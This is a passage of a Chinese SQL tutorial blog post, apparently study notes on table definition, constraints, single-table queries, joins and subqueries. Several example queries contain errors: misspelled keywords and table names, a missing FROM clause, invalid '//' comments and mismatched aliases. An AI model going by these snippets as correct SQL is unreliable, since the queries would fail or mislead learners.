class="keyword">TABLE</span> <span class="operator">&lt;</span>基本表名<span class="operator">&gt;</span> </span><br><span class="line">( <span class="operator">&lt;</span>列名<span class="operator">&gt;</span> <span class="operator">&lt;</span>数据类型<span class="operator">&gt;</span> [<span class="operator">&lt;</span>列级完整性约束条件<span class="operator">&gt;</span>]</span><br><span class="line"> &#123;,<span class="operator">&lt;</span>列名<span class="operator">&gt;</span> <span class="operator">&lt;</span>数据类型<span class="operator">&gt;</span> [<span class="operator">&lt;</span>列级完整性约束条件<span class="operator">&gt;</span>]&#125; ...</span><br><span class="line"> [,表级完整性约束条件]</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>列级完整性约束,作用范围仅限于该列</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NOT NULL 非约束控制:限制列取值不能为空</span><br><span class="line">DEFAULT 指定列的默认值</span><br><span class="line">UNIQUE 唯一性约束:限制列的取值不能重复</span><br><span class="line">CHECK 限制列的取值范围</span><br><span class="line">PRIMARY KEY 主约束:制定本列为主码</span><br><span class="line">FOREIGN KEY 指定本列为引用其他表的外码 [FOREIGN KEY(&lt;外码列名&gt;)] REFERENCE&lt;外表面&gt;(&lt;外表列名&gt;)</span><br></pre></td></tr></table></figure><p>表级约束条件,表级完整性约束的作用范围是整个表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UNIQUE、CHECK、PRIMARY KEY、FOREIGN KEY可以用于定义表级完整性约束</span><br><span class="line">NOT NULL、DEFAULT不可以</span><br></pre></td></tr></table></figure><p>例:</p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012259333.png" style="zoom:50%;" /><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012259916.png" style="zoom:50%;" /><p>2.修改基本表</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> <span class="operator">&lt;</span>基本表名<span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">COLUMN</span> <span class="operator">&lt;</span>列名<span class="operator">&gt;</span> <span class="operator">&lt;</span>新数据类型<span class="operator">&gt;</span> [<span class="keyword">NULL</span><span class="operator">|</span><span class="keyword">NOT</span> <span class="keyword">NULL</span>]  <span class="comment">--修改已有列</span></span><br><span class="line"><span class="operator">|</span><span class="keyword">ADD</span> <span class="operator">&lt;</span>列名<span class="operator">&gt;</span> <span class="operator">&lt;</span>数据类型<span class="operator">&gt;</span> [约束] <span class="comment">--增加新列</span></span><br><span class="line"><span class="operator">|</span><span class="keyword">DROP</span> <span class="keyword">COLUMN</span> <span class="operator">&lt;</span>列名<span class="operator">&gt;</span> <span class="comment">--删除列</span></span><br><span class="line"><span class="operator">|</span><span class="keyword">ADD</span> [<span class="keyword">CONSTRAINT</span> <span class="operator">&lt;</span>约束名<span class="operator">&gt;</span>] <span class="operator">&lt;</span>约束定义<span class="operator">&gt;</span> <span class="comment">--添加约束</span></span><br><span class="line"><span class="operator">|</span><span class="keyword">DROP</span> <span class="keyword">CONSTRAINT</span> <span class="operator">&lt;</span>约束名<span class="operator">&gt;</span> <span class="comment">--删除约束</span></span><br></pre></td></tr></table></figure><p>例:</p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012304240.png" style="zoom:50%;" /><p>3.删除基本表</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span><span class="operator">&lt;</span>基本表名<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure><p>删除一个表时,表的定义、表中的所有数据以及表的索引、触发器、约束等均被删除</p><p>不能删除系统表和有外码约束所参照的表！</p><h3 id="3-4数据查询"><a href="#3-4数据查询" class="headerlink" title="3.4数据查询"></a>3.4数据查询</h3><h4 id="3-4-1SELECT-语句结构"><a href="#3-4-1SELECT-语句结构" class="headerlink" title="3.4.1SELECT 语句结构"></a>3.4.1SELECT 语句结构</h4><p>1.SELECT语句的基本格式如下</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> [<span class="keyword">ALL</span><span class="operator">|</span><span class="keyword">DISTINCT</span>] <span class="operator">&lt;</span>目标列表达式<span class="operator">&gt;</span> </span><br><span class="line">[, <span class="operator">&lt;</span>目标列表达式<span class="operator">&gt;</span>]...</span><br><span class="line"><span class="keyword">FROM</span> <span class="operator">&lt;</span>表名或视图名<span class="operator">&gt;</span>[, <span class="operator">&lt;</span>表名或视图名<span class="operator">&gt;</span>]...</span><br><span class="line">[<span class="keyword">WHERE</span> <span class="operator">&lt;</span>条件表达式<span class="operator">&gt;</span>]</span><br><span class="line">[<span class="keyword">GROUP</span> <span class="keyword">BY</span> <span class="operator">&lt;</span>列名<span class="number">1</span><span class="operator">&gt;</span> [<span class="keyword">HAVING</span> <span class="operator">&lt;</span>条件表达式<span class="operator">&gt;</span>]]</span><br><span class="line">[<span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="operator">&lt;</span>列名<span class="number">2</span><span class="operator">&gt;</span> [<span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>]]</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012310536.png" style="zoom:50%;" /><p>例:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 客户编号,客户姓名,联系电话</span><br><span class="line"><span class="keyword">FROM</span> CustomerInfo</span><br><span class="line"><span class="keyword">WHERE</span> 所在省市<span class="operator">=</span><span class="string">&#x27;江苏南京&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="3-4-2-单表查询"><a href="#3-4-2-单表查询" class="headerlink" title="3.4.2 单表查询"></a>3.4.2 单表查询</h4><p>查询仅涉及一个表,是一种最简单的查询操作</p><h5 id="1-选择列"><a href="#1-选择列" class="headerlink" title="1.选择列"></a>1.选择列</h5><p>(1)选择指定列</p><p>查询全体学生的学号与姓名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sno,Sname <span class="keyword">FROM</span> Student</span><br></pre></td></tr></table></figure><p>(2) 选择表中全部列</p><p>查询全体学生的详细记录</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Student</span><br></pre></td></tr></table></figure><p>(3)查询经过计算的值</p><p>查询全体学生的姓名及出身年份, Sage为年龄</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname,<span class="number">2022</span><span class="operator">-</span>Sage <span class="keyword">FROM</span> Student</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>第<span class="number">2</span>列是一个算术表达式</span><br></pre></td></tr></table></figure><p>(4)更改结果列标题</p><p>查询全体学生的姓名及出生年份,出生年份标题为Sbirth</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname,<span class="number">2022</span><span class="operator">-</span>Sage <span class="keyword">AS</span> Sbirth <span class="keyword">FROM</span> Student</span><br></pre></td></tr></table></figure><p>(5)替换查询结果中的数据</p><p>需要使用查询中的CASE表达式</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CASE</span> </span><br><span class="line"><span class="keyword">WHEN</span> 条件<span class="number">1</span> <span class="keyword">THEN</span> 表达式<span class="number">1</span></span><br><span class="line"><span class="keyword">WHEN</span> 条件<span class="number">2</span> <span class="keyword">THEN</span> 表达式<span class="number">2</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">ELSE</span> 表达式</span><br><span class="line"><span class="keyword">END</span></span><br></pre></td></tr></table></figure><p>替换查询结果中的数据</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 商品编号,商品名称,价格等级<span class="operator">=</span></span><br><span class="line"><span class="keyword">CASE</span> </span><br><span class="line"><span class="keyword">WHEN</span> 单价 <span class="keyword">IS</span> <span class="keyword">NULL</span> <span class="keyword">THEN</span> <span class="string">&#x27;尚未定价&#x27;</span></span><br><span class="line"><span class="keyword">WHEN</span> 单价<span class="operator">&lt;</span><span class="number">20</span> <span class="keyword">THEN</span> <span class="string">&#x27;低&#x27;</span></span><br><span class="line"><span class="keyword">WHEN</span> 单价<span class="operator">&gt;=</span><span class="number">20</span> <span class="keyword">AND</span> 单价<span class="operator">&lt;=</span><span class="number">50</span> <span class="keyword">THEN</span> <span class="string">&#x27;中&#x27;</span></span><br><span class="line"><span class="keyword">WHEN</span> 单价<span class="operator">&gt;</span><span class="number">50</span> <span class="keyword">AND</span> 单价<span class="operator">&lt;=</span><span class="number">100</span> <span class="keyword">THEN</span> <span class="string">&#x27;较高&#x27;</span></span><br><span class="line"><span class="keyword">ELSE</span> <span class="string">&#x27;高&#x27;</span></span><br><span class="line"><span class="keyword">END</span></span><br><span class="line"><span class="keyword">FROM</span> GoodsInfo</span><br></pre></td></tr></table></figure><p>(6) 去除重复行</p><p>在OrderList表中查询订购了商品的客户编号</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> 客户编号 <span class="keyword">FROM</span> OrderList</span><br></pre></td></tr></table></figure><p>查询选修课程的各种成绩</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> Cno,Grade <span class="keyword">FROM</span> SC</span><br></pre></td></tr></table></figure><h5 id="2-选择表中的若干元祖"><a href="#2-选择表中的若干元祖" class="headerlink" title="2.选择表中的若干元祖"></a>2.选择表中的若干元祖</h5><p>(1)比较大小</p><p>常用比较运算符: &#x3D;,&lt;,&gt;,&gt;&#x3D;,&lt;&#x3D;,!&#x3D; 或 &lt;&gt; , !&gt;, !&lt;,    逻辑运算符 NOT + 比较运算符</p><p>查询所有年龄在20岁以下的学生姓名及其年龄</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname,Sage <span class="keyword">FROM</span> Student <span class="keyword">WHERE</span> Sage<span class="operator">&lt;</span><span class="number">20</span></span><br><span class="line"><span class="keyword">SELECT</span> Sname,Sage <span class="keyword">FROM</span> Student <span class="keyword">WHERE</span> <span class="keyword">NOT</span> Sage<span class="operator">&gt;=</span><span class="number">20</span></span><br></pre></td></tr></table></figure><p>(2) 指定范围</p><p>使用谓词 BETWEEN … AND … , NOT BETWEEN … AND …</p><p>查询年龄在20~23岁之间(包括20岁和23岁)的学生姓名、系别和年龄。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname,Sdept,Sage <span class="keyword">WHERE</span> Sage <span class="keyword">BETWEEN</span> <span class="number">20</span> <span class="keyword">AND</span> <span class="number">23</span></span><br></pre></td></tr></table></figure><p>(3)确定集合</p><p>使用谓词 IN&lt;值表&gt; 或 NOT IN &lt;值表&gt;</p><p>&lt;值表&gt; : 用, 分隔的一组取值</p><p>查询信息系,数学系和计算机学生的姓名和性别</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname,Ssex <span class="keyword">FROM</span> Student <span class="keyword">WHERE</span> Sdept <span class="keyword">IN</span> (<span class="string">&#x27;IS&#x27;</span>,<span class="string">&#x27;MA&#x27;</span>,<span class="string">&#x27;CS&#x27;</span>)</span><br></pre></td></tr></table></figure><p>(4)字符串匹配</p><p>a.[NOT] LIKE ‘&lt;匹配串&gt;’ [ESCAPE ‘&lt;换码字符&gt;’]</p><p>&#x3D; 可以用来取代LIKE。!&#x3D;或&lt;&gt;运算符取代NOT LIKE 谓词</p><p>b.通配符</p><p>%代表任意长度(长度可以为0)字符串</p><p>例: a%b, 如ab,asjdlab,acb 都满足该匹配串</p><p>_(下划线)代表任意单个字符</p><p>例: a_b,如acb,afb都满足该匹配串</p><p>1)精确匹配</p><p>匹配学号为95001的学生的详细情况</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Student <span class="keyword">WHERE</span> Sno <span class="keyword">LIKE</span> <span class="string">&#x27;95001&#x27;</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Student <span class="keyword">WHERE</span> Sno<span class="operator">=</span><span class="string">&#x27;95001&#x27;</span></span><br></pre></td></tr></table></figure><p>2)模糊匹配</p><p>查询所有姓刘学生的姓名、学号和性别</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname,Sno,Ssex <span class="keyword">FROM</span> Student <span class="keyword">WHERE</span> Sname <span class="keyword">LIKE</span> <span class="string">&#x27;刘%&#x27;</span></span><br></pre></td></tr></table></figure><p>查询姓’欧阳’且全名为三个汉字的学生姓名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname,Sno,Ssex <span class="keyword">FROM</span> Student <span class="keyword">WHERE</span> Sname <span class="keyword">LIKE</span> <span class="string">&#x27;欧阳_&#x27;</span></span><br></pre></td></tr></table></figure><p>查询所有不姓刘的学生姓名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname <span class="keyword">FROM</span> Student <span class="keyword">WHERE</span> Sname <span class="keyword">NOT</span> <span class="keyword">LIKE</span> <span class="string">&#x27;刘%&#x27;</span></span><br></pre></td></tr></table></figure><p>3)ESCAPE 短语:</p><p>当用户要查询的字符串本身就含有%或_时,要使用ESCAPE ‘&lt;换码字符&gt;’ 短语对通配符进行转义</p><p>查询DB_Design课程的课程号和学分</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Cno,Ccredit <span class="keyword">FROM</span> Course <span class="keyword">WHERE</span> Cname <span class="keyword">LIKE</span> <span class="string">&#x27;DB\_Design&#x27;</span> <span class="keyword">ESCAPE</span> <span class="string">&#x27;\&#x27;</span></span><br></pre></td></tr></table></figure><p>查询以”DB_”开头,且倒数第三个字符为i的课程的详细情况</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Course <span class="keyword">WHERE</span> Cname <span class="keyword">LIKE</span> <span class="string">&#x27;DB\_%i__&#x27;</span> <span class="keyword">ESCAPE</span> <span class="string">&#x27;\&#x27;</span></span><br></pre></td></tr></table></figure><p>(5) 涉及空值的查询</p><p>使用IS NULL 或IS NOT NULL</p><p>某些学生选修课程后没有参加,所以有选课记录,单没有考试成绩。查询缺少成绩的学生的学号和相应的课程号。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sno, Cno <span class="keyword">FROM</span> SC <span class="keyword">WHERE</span> Grade <span class="keyword">IS</span> <span class="keyword">NULL</span></span><br></pre></td></tr></table></figure><p>(6)多重条件查询</p><p>用逻辑运算符AND和OR来联结多个查询条件</p><p>AND的优先级高于OR,可以用括号改变优先级</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname <span class="keyword">FROM</span> Student <span class="keyword">WHERE</span> Sdept<span class="operator">=</span><span class="string">&#x27;CS&#x27;</span> <span class="keyword">AND</span> Sage<span class="operator">&lt;</span><span class="number">20</span></span><br></pre></td></tr></table></figure><p>查询信息系、数学系和计算机系学生的姓名和性别</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname,Ssex <span class="keyword">FROM</span> Student <span class="keyword">WHERE</span> Sdept<span class="operator">=</span><span class="string">&#x27;IS&#x27;</span> <span class="keyword">OR</span> Sdept<span class="operator">=</span><span class="string">&#x27;MA&#x27;</span> <span class="keyword">OR</span> Sdept<span class="operator">=</span><span class="string">&#x27;CS&#x27;</span></span><br></pre></td></tr></table></figure><p>(7)对查询结果排序</p><p>升序:ASC 降序:DESC 默认值为升序(ASC)</p><p>ORDER BY &lt;列名1&gt;[ASC|DESC]</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> SC <span class="keyword">order</span> <span class="keyword">by</span> Sno <span class="keyword">desc</span>, Cno<span class="operator">/</span><span class="operator">/</span>Cno为升序<span class="keyword">asc</span></span><br></pre></td></tr></table></figure><p>(8)聚合函数</p><p>聚合函数是指对集合操作但只返回单个值的函数</p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309020011168.png" style="zoom:50%;" /><p>查询GoddsInfo表中所有商品的平均单价</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">AVG</span>(单价) <span class="keyword">AS</span> <span class="string">&#x27;平均单价&#x27;</span> <span class="keyword">FROM</span> GoodsInfo</span><br></pre></td></tr></table></figure><p>查询GoodsInfo表中最高和最低单价</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">MAX</span>(单价) <span class="keyword">AS</span> <span class="string">&#x27;最高单价&#x27;</span>, <span class="built_in">MIN</span>(单价) <span class="keyword">AS</span> <span class="string">&#x27;最低单价&#x27;</span> <span class="keyword">FROM</span> GoodsInfo</span><br></pre></td></tr></table></figure><p>COUNT用于统计组中满足条件的行数或总行数</p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309020014187.png" style="zoom:50%;" /><p>查询客户总数</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">AS</span> <span class="string">&#x27;客户总数&#x27;</span> <span class="keyword">FROM</span> CustomerInfo</span><br></pre></td></tr></table></figure><p>(9)对查询结果分组</p><p>SELECT语句的GROUP BY子句作用于查询的中间结果表,按某一列或多列值进行分组,值相等的为一组</p><p>分组,聚集函数作用于每个分组</p><p>不分组,聚集函数作用于整个查询结果</p><p>查询各课程的课程的课程号与相应的选修人数</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Cno,<span class="built_in">count</span>(Sno) <span class="keyword">from</span> SC <span class="keyword">group</span> <span class="keyword">by</span> Cno</span><br></pre></td></tr></table></figure><p>(10)使用HAVING子句进行筛选</p><p>HAVING子句必须与GROUP BY 子句结合使用</p><p>查询平均成绩为90分及以上的各课程的课程号与相应的平均成绩</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Cno,<span class="built_in">AVG</span>(Grade) <span class="keyword">FROM</span> SC <span class="keyword">GROUP</span> <span class="keyword">BY</span> Cno <span class="keyword">HAVING</span> <span class="built_in">AVG</span>(Grade) <span class="operator">&gt;=</span> <span class="number">90</span></span><br></pre></td></tr></table></figure><p>注!</p><p>Where子句中不能用聚合函数作为条件表达式, WHERE AVG(Grade) &gt;&#x3D;90的写法是错误的!</p><p>WHERE子句作用于基本表或视图,HAVING短语作用于组</p><h4 id="3-4-3-连接查询"><a href="#3-4-3-连接查询" class="headerlink" title="3.4.3 连接查询"></a>3.4.3 连接查询</h4><p>同时涉及多个表的查询称为连接查询</p><p>连接查询有两种形式: 1. 连接谓词。2.以JOIN关键字指定的连接。</p><h5 id="1-连接谓词"><a href="#1-连接谓词" class="headerlink" title="1.连接谓词"></a>1.连接谓词</h5><p>用来连接两个表的条件称为连接条件或连接谓词，可用逻辑运算符AND和OR 来连接多个连接谓词</p><p>连接字段:连接谓词中的列名称为联结字段</p><p>一般格式: &lt;表名1&gt;.列名 &lt;比较运算符&gt; &lt;表名2&gt;.&lt;列名2&gt;</p><p>等值连接实例:</p><p>查询每个学生及其选课情况</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Student.<span class="operator">*</span>,SC.<span class="operator">*</span> <span class="keyword">FROM</span> Student,SC <span class="keyword">WHERE</span> Student.Sno<span class="operator">=</span>Sc.Sno</span><br></pre></td></tr></table></figure><p>查询选修了三号课程且成绩在90分以上所有学生的学号、姓名-复合条件连接</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Student.Sno,Sname <span class="keyword">from</span> Student,SC <span class="keyword">where</span> Student.Sno<span class="operator">=</span>Sc.Sno <span class="keyword">and</span> Sc.Cno<span class="operator">=</span><span class="number">3</span> <span class="keyword">and</span> SC.Grade<span class="operator">&gt;</span><span class="number">90</span></span><br></pre></td></tr></table></figure><p>在Customer表中查询具有相同姓名的客户信息</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> KH1.<span class="operator">*</span> <span class="keyword">FROM</span> CustomerInfo KH1, CustomerInfo KH2 <span class="keyword">WHERE</span> KH1.客户姓名<span class="operator">=</span>KH2.客户姓名 <span class="keyword">AND</span> KH1.客户编号<span class="operator">&lt;&gt;</span>KH2.客户编号</span><br></pre></td></tr></table></figure><h5 id="2-以JOIN关键字指定的连接"><a href="#2-以JOIN关键字指定的连接" class="headerlink" title="2.以JOIN关键字指定的连接"></a>2.以JOIN关键字指定的连接</h5><p>INNER JOIN-内连接, OUTER JOIN-外连接</p><p>a.内连接</p><p>内连接按照ON所指定的连接条件合并两个表,返回满足条件的行,一般格式</p><p>FROM &lt;表名1&gt; JOIN &lt;表名2&gt; ON &lt;表名1.列名&gt;&#x3D;&lt;表名2.列名&gt;</p><p>例: 查找商品订购数据库每个订购了商品的客户及订单情况</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> a.<span class="operator">*</span>,b.商品编号,b.订购时间,b.数量,b.需要日期,b.付款方式,b.送货方式 <span class="keyword">FROM</span> CustomerInfo a <span class="keyword">INNER</span> <span class="keyword">JOIN</span> OrderList b <span class="keyword">ON</span> CustomerInfo.客户编号<span class="operator">=</span>OrderList.客户编号</span><br></pre></td></tr></table></figure><p>用FROM的JOIN关键字表达下列查询:在商品数据库中查询订购了类别为”体育用品”的客户的客户编号,客户姓名,联系方式以及商品的需要日期</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> CustomerInfo.客户编号,客户姓名,联系电话,需要日期 <span class="keyword">FROM</span> CustomerInfo <span class="keyword">JOIN</span> GoodsInfo <span class="keyword">JOIN</span> OrderList <span class="keyword">ON</span> GoodsInfo.商品编号<span class="operator">=</span>OrderList.商品编号 <span class="keyword">ON</span> CustomerInfo.客户编号 <span class="operator">=</span> OrderList.客户编号 <span class="keyword">WHERE</span> 商品类别 <span class="operator">=</span> <span class="string">&#x27;体育用品&#x27;</span></span><br></pre></td></tr></table></figure><p>b.外连接</p><p>外连接的结果表不但包含满足连接条件的行,还包括相应表中的所有行.</p><p>外连接包括三种: 左外连接,右外连接,完全外连接</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Student.Sno,Sname,Ssex,Sage,Sdept,Cno,Grade <span class="keyword">from</span> Student <span class="keyword">left</span> (<span class="keyword">outer</span>) <span class="keyword">join</span> SC <span class="keyword">on</span> Student.Sno<span class="operator">=</span>SC.Sno</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Stuent.Sno,Sname,Ssex,Sage,Sdept,Cno,Grade <span class="keyword">from</span> SC <span class="keyword">right</span> <span class="keyword">join</span> Student <span class="keyword">ON</span> Student.Sno<span class="operator">=</span>SC.Sno</span><br></pre></td></tr></table></figure><h4 id="3-4-4-嵌套查询"><a href="#3-4-4-嵌套查询" class="headerlink" title="3.4.4 嵌套查询"></a>3.4.4 嵌套查询</h4><p>一个SELECT-FROM-WHERE 语句称为一个查询块</p><p>将一个查询块嵌套在另一个查询块的WHERE子句或HAVING短语的条件中的查询称为嵌套查询</p><p>子查询不能用ORDER BY 子句!</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname<span class="operator">/</span><span class="operator">/</span>外层查询<span class="operator">/</span>父查询</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sno <span class="keyword">IN</span> </span><br><span class="line">( SELET Sno <span class="keyword">FROM</span> SC<span class="operator">/</span><span class="operator">/</span>内层查询<span class="operator">/</span>子查询 </span><br><span class="line">     <span class="keyword">WHERE</span> Cno<span class="operator">=</span><span class="string">&#x27;2&#x27;</span>) </span><br></pre></td></tr></table></figure><p>引出子查询的谓词: </p><ol><li>带有IN谓词的子查询</li><li>带有比较运算符的子查询</li><li>带有ALL(SOME) 或ANY谓词的子查询</li><li>带有EXISTS谓词的子查询</li></ol><h5 id="1-带有IN谓词的子查询"><a href="#1-带有IN谓词的子查询" class="headerlink" title="1.带有IN谓词的子查询"></a>1.带有IN谓词的子查询</h5><p>IN和NOT IN 子查询只能返回一列数据</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> CustomerInfo <span class="keyword">WHERE</span> 所在省市 <span class="keyword">IN</span> (<span class="keyword">SELECT</span> 所在省市 <span class="keyword">FROM</span> Customer <span class="keyword">WHERE</span> 客户姓名<span class="operator">=</span><span class="string">&#x27;张小林&#x27;</span>)</span><br></pre></td></tr></table></figure><h5 id="2-带有比较运算符的子查询"><a href="#2-带有比较运算符的子查询" class="headerlink" title="2.带有比较运算符的子查询"></a>2.带有比较运算符的子查询</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> OrderList <span class="keyword">WHERE</span> 商品编号<span class="operator">=</span><span class="string">&#x27;10010001&#x27;</span> <span class="keyword">AND</span> 数量 <span class="operator">&gt;</span> (<span class="keyword">SELECT</span> <span class="built_in">AVG</span>(数量) <span class="keyword">FROM</span> OrderList <span class="keyword">WHERE</span> 商品编号<span class="operator">=</span><span class="string">&#x27;10010001&#x27;</span>)</span><br></pre></td></tr></table></figure><h5 id="3-带有ALL-SOME-或ANY谓词的子查询"><a href="#3-带有ALL-SOME-或ANY谓词的子查询" class="headerlink" title="3.带有ALL(SOME) 或ANY谓词的子查询"></a>3.带有ALL(SOME) 或ANY谓词的子查询</h5><p>ALL指定表达式要与子查询结果集中地每个值都进行比较,当表达式每个值都满足比较关系时,才返回TRUE,否则返回FALSE</p><p>ANY与SOME的限制含义相同,通常采用ANY,表示表达式只要与子查询结果集中的某个值满足比较关系式就返回TRUE,否则返回FLASE</p><p>查询比某个食品类的商品单价低的商品信息</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> GoodsInfo <span class="keyword">WHERE</span> 商品类别<span class="operator">&lt;&gt;</span><span class="string">&#x27;食品&#x27;</span> <span class="keyword">AND</span> 单价<span class="operator">&lt;</span><span class="keyword">ANY</span></span><br><span class="line">(</span><br><span class="line">    <span class="keyword">SELECT</span> 单价 <span class="keyword">FROM</span> GoodsInfo <span class="keyword">WHERE</span> 食品类别<span class="operator">=</span><span class="string">&#x27;食品&#x27;</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure><p>ANY在子查询返回结果为NULL时,表达式为FALSE</p><p>ALL在子查询返回结果为NULL时,表达式为TRUE</p><h5 id="4-带有EXISTS谓词的子查询"><a href="#4-带有EXISTS谓词的子查询" class="headerlink" title="4.带有EXISTS谓词的子查询"></a>4.带有EXISTS谓词的子查询</h5><p>EXISTS谓词用于测试子查询的结果是否为空表,若子查询结果集不为空,EXISTS返回TURE,否则返回FALSE</p><p>查找订购了编号为”10010001”商品的客户姓名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 客户姓名 <span class="keyword">FROM</span> CustomerInfo a <span class="keyword">WHERE</span> <span class="keyword">EXISTS</span> (</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> OrderList b <span class="keyword">WHERE</span> b.客户编号<span class="operator">=</span>a.客户编号 <span class="keyword">AND</span></span><br><span class="line">    b.商品编号<span class="operator">=</span><span class="string">&#x27;10010001&#x27;</span>   </span><br><span class="line">)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309020800669.png"></p><p>查询选修了全部课程的学生姓名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname <span class="keyword">FROM</span> Student <span class="keyword">WHERE</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> </span><br><span class="line">(</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line">    <span class="keyword">FROM</span> Course</span><br><span class="line">    <span class="keyword">WHERE</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span></span><br><span class="line">    (</span><br><span class="line">            <span class="keyword">SELECT</span> <span class="operator">*</span> </span><br><span class="line">                <span class="keyword">FROM</span> SC</span><br><span class="line">                <span class="keyword">WHERE</span> Sno<span class="operator">=</span>Student.Sno <span class="keyword">AND</span></span><br><span class="line">                Cno<span class="operator">=</span>Course.Cno</span><br><span class="line">            )</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h4 id="3-4-5集合查询"><a href="#3-4-5集合查询" class="headerlink" title="3.4.5集合查询"></a>3.4.5集合查询</h4><p>集合操作主要包括: 并,交,差</p><h5 id="1-并"><a href="#1-并" class="headerlink" 